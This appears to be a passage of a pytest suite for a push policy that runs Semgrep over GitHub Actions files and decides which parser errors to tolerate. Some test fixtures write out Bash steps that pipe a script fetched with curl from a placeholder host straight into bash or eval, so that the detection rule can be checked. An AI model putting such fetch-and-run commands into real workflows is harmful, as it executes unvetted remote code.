    assert policy.scan_pushed_heads(io.StringIO(), tmp_path) == 2


def test_semgrep_uses_sibling_binary_without_version_probe(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    policy._resolve_semgrep_executable.cache_clear()
    policy._semgrep_pinned_version.cache_clear()
    bin_dir = tmp_path / "venv" / "bin"
    bin_dir.mkdir(parents=True)
    sibling = bin_dir / ("semgrep.exe" if os.name == "nt" else "semgrep")
    sibling.write_text("", encoding="utf-8")
    sibling.chmod(0o755)
    monkeypatch.setattr(policy.sys, "executable", str(bin_dir / "python"))
    calls: list[list[str]] = []

    def fake_run(
        args: Sequence[str],
        *_args: object,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        calls.append(list(args))
        assert args[1] != "--version"
        return _semgrep_completed(0, [tmp_path / "source.py"])

    monkeypatch.setattr(policy, "_run_command", fake_run)

    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)

    assert result.returncode == 0
    assert calls[0][0] == str(sibling)
    policy._resolve_semgrep_executable.cache_clear()
    policy._semgrep_pinned_version.cache_clear()


def test_semgrep_falls_back_to_matching_path_binary(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    policy._resolve_semgrep_executable.cache_clear()
    policy._semgrep_pinned_version.cache_clear()
    bin_dir = tmp_path / "venv" / "bin"
    bin_dir.mkdir(parents=True)
    fallback = tmp_path / "path-semgrep"
    monkeypatch.setattr(policy.sys, "executable", str(bin_dir / "python"))
    monkeypatch.setattr(policy.shutil, "which", lambda command: str(fallback))
    monkeypatch.setattr(policy, "_semgrep_pinned_version", lambda _repo_root=tmp_path: "1.171.0")
    calls: list[list[str]] = []

    def fake_run(
        args: Sequence[str],
        *_args: object,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        calls.append(list(args))
        if args == [str(fallback), "--version"]:
            return subprocess.CompletedProcess(args, 0, "1.171.0\n", "")
        return _semgrep_completed(0, [tmp_path / "source.py"])

    monkeypatch.setattr(policy, "_run_command", fake_run)

    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)

    assert result.returncode == 0
    assert calls[0] == [str(fallback), "--version"]
    assert calls[1][0] == str(fallback)
    policy._resolve_semgrep_executable.cache_clear()


def test_semgrep_fallback_version_mismatch_blocks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    policy._resolve_semgrep_executable.cache_clear()
    policy._semgrep_pinned_version.cache_clear()
    bin_dir = tmp_path / "venv" / "bin"
    bin_dir.mkdir(parents=True)
    fallback = tmp_path / "path-semgrep"
    monkeypatch.setattr(policy.sys, "executable", str(bin_dir / "python"))
    monkeypatch.setattr(policy.shutil, "which", lambda command: str(fallback))
    monkeypatch.setattr(policy, "_semgrep_pinned_version", lambda _repo_root=tmp_path: "1.171.0")
    calls: list[list[str]] = []

    def fake_run(
        args: Sequence[str],
        *_args: object,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        calls.append(list(args))
        return subprocess.CompletedProcess(args, 0, "1.153.1\n", "")

    monkeypatch.setattr(policy, "_run_command", fake_run)

    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)

    assert result.returncode == 2
    assert "pyproject.toml pins 1.171.0" in result.stderr
    assert str(fallback) in result.stderr
    assert "1.153.1" in result.stderr
    assert calls == [[str(fallback), "--version"]]
    policy._resolve_semgrep_executable.cache_clear()


def test_semgrep_missing_pyproject_reports_pin_read_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    policy._resolve_semgrep_executable.cache_clear()
    policy._semgrep_pinned_version.cache_clear()
    bin_dir = tmp_path / "venv" / "bin"
    bin_dir.mkdir(parents=True)
    fallback = tmp_path / "path-semgrep"
    monkeypatch.setattr(policy.sys, "executable", str(bin_dir / "python"))
    monkeypatch.setattr(policy.shutil, "which", lambda command: str(fallback))
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda args, *_args, **_kwargs: subprocess.CompletedProcess(
            args,
            0,
            "1.171.0\n",
            "",
        ),
    )

    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)

    assert result.returncode == 2
    assert "cannot read semgrep pin from" in result.stderr
    assert "pyproject.toml" in result.stderr
    assert "semgrep executable not found" not in result.stderr
    policy._resolve_semgrep_executable.cache_clear()
    policy._semgrep_pinned_version.cache_clear()


def test_semgrep_pin_is_read_from_pyproject() -> None:
    policy._semgrep_pinned_version.cache_clear()
    pyproject = PROJECT_ROOT / "pyproject.toml"
    matches = re.findall(r'^\s*"semgrep==([^"]+)",\s*$', pyproject.read_text(), re.MULTILINE)

    assert matches == [policy._semgrep_pinned_version(PROJECT_ROOT)] * 2
    policy._semgrep_pinned_version.cache_clear()


def test_semgrep_missing_executable_blocks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(FileNotFoundError()),
    )

    assert policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path).returncode == 2


def test_semgrep_disables_native_suppressions(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    calls: list[list[str]] = []

    def fake_run(
        args: Sequence[str],
        *_args: object,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        calls.append(list(args))
        return _semgrep_completed(0, [tmp_path / "source.py"])

    monkeypatch.setattr(policy, "_run_command", fake_run)

    assert policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path).returncode == 0
    assert "--disable-nosem" in calls[0]
    assert "--x-ignore-semgrepignore-files" in calls[0]
    assert "--max-target-bytes=0" in calls[0]
    assert "--no-exclude-binary-files" in calls[0]
    assert "--exclude-rule" not in calls[0]
    assert "--" in calls[0]
    assert str(tmp_path / "source.py") in calls[0]
    assert str(tmp_path) not in calls[0]


@pytest.mark.skipif(SEMGREP is None, reason="semgrep executable is unavailable")
def test_semgrep_real_cli_scans_ignored_file_over_default_size_limit(
    tmp_path: Path,
) -> None:
    target = tmp_path / "ignored-large.py"
    _write_lf(target, "value = 1\n" + "# padding\n" * 110_000)
    _write_lf(tmp_path / ".semgrepignore", f"{target.name}\n")
    config = tmp_path / "semgrep.yml"
    _write_lf(
        config,
        """
rules:
  - id: impossible-equality
    languages: [python]
    message: impossible
    severity: ERROR
    pattern: $X == $X
""".lstrip(),
    )
    command = policy._semgrep_command(str(config), [str(target)])
    assert SEMGREP is not None
    command[0] = SEMGREP

    result = subprocess.run(
        command,
        cwd=tmp_path,
        text=True,
        encoding="utf-8",
        errors="replace",
        capture_output=True,
        check=False,
    )

    assert result.returncode == 0, result.stderr
    payload = json.loads(result.stdout)
    assert payload["errors"] == []
    assert Path(str(payload["paths"]["scanned"][0])).resolve() == target.resolve()


@pytest.mark.skipif(SEMGREP is None, reason="semgrep executable is unavailable")
def test_semgrep_real_cli_blocks_bash_curl_rules_with_powershell_step(
    tmp_path: Path,
) -> None:
    target = tmp_path / "mixed-shell-action.yml"
    _write_lf(
        target,
        """
name: mixed shell
runs:
  using: composite
  steps:
    - shell: pwsh
      run: |
        if ($env:ENABLE -eq 'true') {
          Write-Host "safe"
        }
    - shell: bash
      run: |
        DATA=$(curl -fsSL https://example.com/install.sh)
        eval "$DATA"
        curl -fsSL https://example.com/install.sh | bash
""".lstrip(),
    )

    result = policy._run_semgrep_tree(tmp_path, [target.name], tmp_path)

    assert result.returncode == 1, result.stderr
    payload = json.loads(result.stdout)
    check_ids = {finding["check_id"] for finding in payload["results"]}
    assert policy.SEMGREP_POWERSHELL_RULES <= check_ids


@pytest.mark.parametrize(
    ("stdout", "expected_error"),
    [
        ("not json", "invalid Semgrep JSON"),
        ("[]", "root is not an object"),
        ('{"paths": {}}', "lacks scanned target paths"),
        ('{"paths": {"scanned": [1]}}', "lacks scanned target paths"),
    ],
)
def test_semgrep_rejects_invalid_scanned_target_manifest(
    tmp_path: Path,
    stdout: str,
    expected_error: str,
) -> None:
    result = policy._verify_semgrep_targets(
        _completed(0, stdout, "semgrep warning\n"),
        [str(tmp_path / "source.py")],
        tmp_path,
    )

    assert result.returncode == 2
    assert expected_error in result.stderr
    assert "semgrep warning" in result.stderr


def test_semgrep_rejects_omitted_requested_target(tmp_path: Path) -> None:
    result = policy._verify_semgrep_targets(
        _semgrep_completed(0, [tmp_path / "first.py"]),
        [str(tmp_path / "first.py"), str(tmp_path / "second.py")],
        tmp_path,
    )

    assert result.returncode == 2
    assert "Semgrep omitted requested targets" in result.stderr
    assert "second.py" in result.stderr


def test_semgrep_tree_blocks_omitted_requested_target(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _semgrep_completed(0, []),
    )

    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)

    assert result.returncode == 2
    assert "Semgrep omitted requested targets" in result.stderr


@pytest.mark.parametrize(
    "payload",
    [
        {"paths": {"scanned": ["source.py"]}},
        {
            "errors": [{"message": "parser failed"}],
            "paths": {"scanned": ["source.py"]},
        },
    ],
)
def test_semgrep_rejects_missing_or_nonempty_error_manifest(
    tmp_path: Path,
    payload: dict[str, object],
) -> None:
    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(tmp_path / "source.py")],
        tmp_path,
    )

    assert result.returncode == 2
    assert "Semgrep" in result.stderr


@pytest.mark.parametrize("rule_id", sorted(policy.SEMGREP_POWERSHELL_RULES))
def test_semgrep_allows_known_powershell_parser_mismatch(
    tmp_path: Path,
    rule_id: str,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(
        target,
        'runs:\n  using: composite\n  steps:\n    - shell: pwsh\n      run: Write-Host "safe"\n',
    )
    payload = {
        "errors": [_powershell_semgrep_error(target, rule_id)],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 0


def test_semgrep_allows_partial_parsing_at_powershell_step(tmp_path: Path) -> None:
    target = tmp_path / "action.yml"
    _write_lf(
        target,
        "runs:\n"
        "  steps:\n"
        "    - shell: pwsh\n"
        "      run: |\n"
        "        Write-Host 'safe'\n"
        "    - shell: bash\n"
        "      run: echo safe\n",
    )
    payload = {
        "errors": [_powershell_partial_parsing_error(target, line=4)],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 0


def test_semgrep_allows_partial_parsing_in_a_crlf_workflow(tmp_path: Path) -> None:
    """A CRLF worktree must not turn a tolerated parse error into a blocked push.

    The Windows runner writes fixtures through the platform newline translation,
    so the file lands as CRLF while every offset the policy compares against is
    computed from the decoded text. Reading the fixture as bytes keeps the two
    in agreement no matter which separator the worktree carries.
    """
    target = tmp_path / "action.yml"
    target.write_text(
        "runs:\n"
        "  steps:\n"
        "    - shell: pwsh\n"
        "      run: |\n"
        "        Write-Host 'safe'\n"
        "    - shell: bash\n"
        "      run: echo safe\n",
        encoding="utf-8",
        newline="\r\n",
    )
    assert b"\r\n" in target.read_bytes()
    payload = {
        "errors": [_powershell_partial_parsing_error(target, line=4)],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 0


def test_semgrep_rejects_code_two_error_at_bash_step_in_mixed_shell_file(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    bash_script = 'DATA=$(curl -fsSL https://example.com/install.sh)\neval "$DATA"'
    _write_lf(
        target,
        "runs:\n"
        "  steps:\n"
        "    - shell: pwsh\n"
        "      run: Write-Host 'safe'\n"
        "    - shell: bash\n"
        "      run: |\n"
        "        DATA=$(curl -fsSL https://example.com/install.sh)\n"
        '        eval "$DATA"\n',
    )
    payload = {
        "errors": [
            _powershell_semgrep_error(
                target,
                "yaml.github-actions.security.curl-eval.curl-eval",
                bash_script,
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_code_two_error_with_ambiguous_shell_attribution(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    script = 'Write-Host "safe"'
    _write_lf(
        target,
        "runs:\n"
        "  steps:\n"
        "    - shell: pwsh\n"
        f"      run: {script}\n"
        "    - shell: bash\n"
        f"      run: {script}\n",
    )
    payload = {
        "errors": [
            _powershell_semgrep_error(
                target,
                "yaml.github-actions.security.curl-eval.curl-eval",
                script,
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_short_truncated_code_two_snippet(tmp_path: Path) -> None:
    target = tmp_path / "action.yml"
    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
    payload = {
        "errors": [
            _powershell_semgrep_error(
                target,
                "yaml.github-actions.security.curl-eval.curl-eval",
                "Write... (truncated 100 more characters)",
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_code_two_error_when_yaml_cannot_be_parsed(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(target, 'runs:\n  steps: [\n    - shell: pwsh\n      run: Write-Host "safe"\n')
    payload = {
        "errors": [
            _powershell_semgrep_error(
                target,
                "yaml.github-actions.security.curl-eval.curl-eval",
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_code_two_error_when_yaml_is_empty(tmp_path: Path) -> None:
    target = tmp_path / "action.yml"
    _write_lf(target, "")
    payload = {
        "errors": [
            _powershell_semgrep_error(
                target,
                "yaml.github-actions.security.curl-eval.curl-eval",
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_accepts_code_two_error_for_aliased_powershell_step(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(
        target,
        "shared: &shared\n"
        "  shell: pwsh\n"
        '  run: Write-Host "safe"\n'
        "runs:\n"
        "  steps:\n"
        "    - *shared\n",
    )
    payload = {
        "errors": [
            _powershell_semgrep_error(
                target,
                "yaml.github-actions.security.curl-eval.curl-eval",
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 0


def test_semgrep_rejects_nontruncated_code_two_snippet_prefix(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(
        target,
        "runs:\n"
        "  steps:\n"
        "    - shell: pwsh\n"
        "      run: |\n"
        "        Write-Host 'first'\n"
        "        Write-Host 'second'\n",
    )
    payload = {
        "errors": [
            _powershell_semgrep_error(
                target,
                "yaml.github-actions.security.curl-eval.curl-eval",
                "Write-Host 'first'",
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_accepts_long_truncated_code_two_powershell_snippet(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    lines = [f"Write-Host 'verification line {index}'" for index in range(5)]
    _write_lf(
        target,
        "runs:\n"
        "  steps:\n"
        "    - shell: pwsh\n"
        "      run: |\n" + "".join(f"        {line}\n" for line in lines),
    )
    snippet = "\n".join([*lines[:-1], lines[-1][:15]])
    payload = {
        "errors": [
            _powershell_semgrep_error(
                target,
                "yaml.github-actions.security.curl-eval.curl-eval",
                f"{snippet}... (truncated 20 more characters)",
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 0


def test_semgrep_unicode_line_matching_handles_large_mismatch_linearly() -> None:
    expected = f"{'✓' * 10_000} safe"
    observed = f"{'X' * 10_000} unsafe"

    assert not policy._semgrep_line_matches_run_line(observed, expected)


@pytest.mark.parametrize(
    ("line", "rule_id"),
    [
        (6, "yaml.github-actions.security.curl-eval.curl-eval"),
        (4, "yaml.github-actions.security.other-rule"),
    ],
)
def test_semgrep_rejects_unrecognized_partial_parsing_error(
    tmp_path: Path,
    line: int,
    rule_id: str,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(
        target,
        "runs:\n"
        "  steps:\n"
        "    - shell: pwsh\n"
        "      run: Write-Host 'safe'\n"
        "    - shell: bash\n"
        "      run: echo safe\n",
    )
    payload = {
        "errors": [
            _powershell_partial_parsing_error(
                target,
                line=line,
                rule_id=rule_id,
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_allowlisted_rule_id_only_in_target_path(
    tmp_path: Path,
) -> None:
    allowed_rule = "yaml.github-actions.security.curl-eval.curl-eval"
    target = tmp_path / f"When parsing in rule '{allowed_rule}', action.yml"
    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
    error = _powershell_partial_parsing_error(
        target,
        line=4,
        rule_id="yaml.github-actions.security.other-rule",
    )
    error["message"] = (
        f"Syntax error at line {target}:4:\n "
        "When parsing a snippet as Bash for metavariable-pattern "
        "in rule 'yaml.github-actions.security.other-rule'"
    )
    payload = {
        "errors": [error],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_partial_parsing_location_for_other_target(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
    error = _powershell_partial_parsing_error(target, line=4)
    error_type = error["type"]
    assert isinstance(error_type, list)
    locations = error_type[1]
    assert isinstance(locations, list)
    location = locations[0]
    assert isinstance(location, dict)
    location["path"] = str(tmp_path / "other.yml")
    payload = {
        "errors": [error],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_partial_parsing_span_crossing_into_bash_step(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    content = (
        "runs:\n"
        "  steps:\n"
        "    - shell: pwsh\n"
        "      run: |\n"
        "        Write-Host 'safe'\n"
        "    - shell: bash\n"
        "      run: echo unsafe\n"
    )
    _write_lf(target, content)
    error = _powershell_partial_parsing_error(target, line=4)
    error_type = error["type"]
    assert isinstance(error_type, list)
    locations = error_type[1]
    assert isinstance(locations, list)
    location = locations[0]
    assert isinstance(location, dict)
    bash_offset = content.index("echo unsafe") + len("echo")
    location["end"] = {
        "line": 7,
        "col": 16,
        "offset": bash_offset,
    }
    payload = {
        "errors": [error],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_allows_partial_parsing_span_inside_powershell_step(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    content = (
        "runs:\n"
        "  steps:\n"
        "    - shell: pwsh\n"
        "      run: |\n"
        "        Write-Host 'safe'\n"
        "    - shell: bash\n"
        "      run: echo safe\n"
    )
    _write_lf(target, content)
    error = _powershell_partial_parsing_error(target, line=4)
    error_type = error["type"]
    assert isinstance(error_type, list)
    locations = error_type[1]
    assert isinstance(locations, list)
    location = locations[0]
    assert isinstance(location, dict)
    powershell_offset = content.index("Write-Host") + len("Write-Host")
    location["end"] = {
        "line": 5,
        "col": 19,
        "offset": powershell_offset,
    }
    payload = {
        "errors": [error],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 0


def test_semgrep_allows_partial_parsing_span_ending_at_scalar_eof(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    content = (
        "runs:\n"
        "  steps:\n"
        "    - shell: pwsh\n"
        "      run: |\n"
        "        Write-Host 'first'\n"
        "        Write-Host 'last'"
    )
    _write_lf(target, content)
    error = _powershell_partial_parsing_error(target, line=4)
    error_type = error["type"]
    assert isinstance(error_type, list)
    locations = error_type[1]
    assert isinstance(locations, list)
    location = locations[0]
    assert isinstance(location, dict)
    location["end"] = {
        "line": 6,
        "col": len("        Write-Host 'last'") + 1,
        "offset": len(content),
    }
    payload = {
        "errors": [error],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 0


@pytest.mark.parametrize(
    ("shell", "rule_id"),
    [
        ("bash", "yaml.github-actions.security.curl-eval.curl-eval"),
        ("pwsh", "other.rule"),
    ],
)
def test_semgrep_rejects_unrecognized_internal_matching_error(
    tmp_path: Path,
    shell: str,
    rule_id: str,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(
        target,
        f"runs:\n  using: composite\n  steps:\n    - shell: {shell}\n      run: echo safe\n",
    )
    payload = {
        "errors": [_powershell_semgrep_error(target, rule_id)],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


@pytest.mark.parametrize(
    "error",
    [
        "not-an-object",
        {
            "level": "warn",
            "message": None,
            "path": "action.yml",
        },
        {
            "level": "warn",
            "message": "parser failed",
            "path": None,
        },
        {
            "code": 3,
            "level": "warn",
            "type": ["PartialParsing", {}],
            "path": "action.yml",
            "message": (
                "When parsing a snippet as Bash for metavariable-pattern "
                "in rule 'yaml.github-actions.security.curl-eval.curl-eval'"
            ),
        },
        {
            "code": 3,
            "level": "warn",
            "type": ["PartialParsing", [None]],
            "path": "action.yml",
            "message": (
                "When parsing a snippet as Bash for metavariable-pattern "
                "in rule 'yaml.github-actions.security.curl-eval.curl-eval'"
            ),
        },
        {
            "code": 3,
            "level": "warn",
            "type": ["PartialParsing", [{"start": {}}]],
            "path": "action.yml",
            "message": (
                "When parsing a snippet as Bash for metavariable-pattern "
                "in rule 'yaml.github-actions.security.curl-eval.curl-eval'"
            ),
        },
        {
            "code": 3,
            "level": "warn",
            "type": [
                "PartialParsing",
                [
                    {
                        "path": "action.yml",
                        "start": {"line": "4", "col": 1, "offset": 0},
                        "end": {"line": 4, "col": 2, "offset": 1},
                    }
                ],
            ],
            "path": "action.yml",
            "message": (
                "When parsing a snippet as Bash for metavariable-pattern "
                "in rule 'yaml.github-actions.security.curl-eval.curl-eval'"
            ),
        },
    ],
)
def test_semgrep_rejects_malformed_partial_parsing_error(
    tmp_path: Path,
    error: object,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
    payload = {
        "errors": [error],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_error_outside_requested_targets(tmp_path: Path) -> None:
    target = tmp_path / "action.yml"
    outside = tmp_path / "outside.yml"
    _write_lf(target, "name: safe\n")
    _write_lf(outside, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
    payload = {
        "errors": [
            _powershell_semgrep_error(
                outside,
                "yaml.github-actions.security.curl-eval.curl-eval",
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_partial_parsing_without_shell_declaration(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(target, "name: safe\n")
    payload = {
        "errors": [_powershell_partial_parsing_error(target, line=1)],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_partial_parsing_at_default_shell_step(
    tmp_path: Path,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(
        target,
        "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n    - run: echo safe\n",
    )
    payload = {
        "errors": [_powershell_partial_parsing_error(target, line=5)],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


@pytest.mark.parametrize("line", [-1, 0, 999])
def test_semgrep_rejects_partial_parsing_with_invalid_line(
    tmp_path: Path,
    line: int,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
    payload = {
        "errors": [_powershell_partial_parsing_error(target, line=line)],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_unreadable_error_target(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
    original_read_text = Path.read_text

    def fail_for_target(
        path: Path,
        encoding: str | None = None,
        errors: str | None = None,
    ) -> str:
        if path == target:
            raise OSError("unreadable")
        return original_read_text(path, encoding=encoding, errors=errors)

    monkeypatch.setattr(Path, "read_text", fail_for_target)
    payload = {
        "errors": [
            _powershell_semgrep_error(
                target,
                "yaml.github-actions.security.curl-eval.curl-eval",
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_rejects_non_utf8_error_target(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    target = tmp_path / "action.yml"
    _write_lf(target, "runs:\n  steps:\n    - shell: pwsh\n      run: Write-Host 'safe'\n")
    payload = {
        "errors": [
            _powershell_semgrep_error(
                target,
                "yaml.github-actions.security.curl-eval.curl-eval",
            )
        ],
        "paths": {"scanned": [str(target)]},
    }

    def fail_decode(
        _path: Path,
        encoding: str | None = None,
        errors: str | None = None,
    ) -> str:
        del encoding, errors
        raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid")

    monkeypatch.setattr(Path, "read_text", fail_decode)

    result = policy._verify_semgrep_targets(
        _completed(0, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 2


def test_semgrep_preserves_finding_exit_after_target_verification(tmp_path: Path) -> None:
    result = policy._verify_semgrep_targets(
        _semgrep_completed(1, ["source.py"]),
        [str(tmp_path / "source.py")],
        tmp_path,
    )

    assert result.returncode == 1


def test_semgrep_command_error_bypasses_target_manifest_validation(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: _completed(2, "not json", "configuration error"),
    )

    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)

    assert result.returncode == 2
    assert result.stderr == "configuration error"


def test_semgrep_batches_targets_within_count_and_length_limits() -> None:
    targets = [f"/tmp/{index:04d}-{'x' * 400}.py" for index in range(250)]

    batches = policy._semgrep_target_batches(targets)

    assert [target for batch in batches for target in batch] == targets
    assert all(len(batch) <= policy.SEMGREP_BATCH_TARGET_LIMIT for batch in batches)
    assert all(
        sum(len(argument) + 1 for argument in policy._semgrep_command("auto", batch))
        <= policy.SEMGREP_COMMAND_LENGTH_LIMIT
        for batch in batches
    )


def test_semgrep_scans_every_batch_and_preserves_finding_result(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    paths = [f"source-{index:03d}.py" for index in range(205)]
    calls: list[list[str]] = []

    def fake_run(
        args: Sequence[str],
        *_args: object,
        **_kwargs: object,
    ) -> subprocess.CompletedProcess[str]:
        command = list(args)
        calls.append(command)
        separator = command.index("--")
        targets = command[separator + 1 :]
        return _semgrep_completed(1 if len(calls) == 1 else 0, targets)

    monkeypatch.setattr(policy, "_run_command", fake_run)

    result = policy._run_semgrep_tree(tmp_path, paths, tmp_path)

    assert result.returncode == 1
    assert len(calls) == 3
    assert sum(len(call[call.index("--") + 1 :]) for call in calls) == len(paths)


def test_semgrep_execution_os_error_blocks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        policy,
        "_run_command",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(PermissionError("denied")),
    )

    result = policy._run_semgrep_tree(tmp_path, ["source.py"], tmp_path)

    assert result.returncode == 2
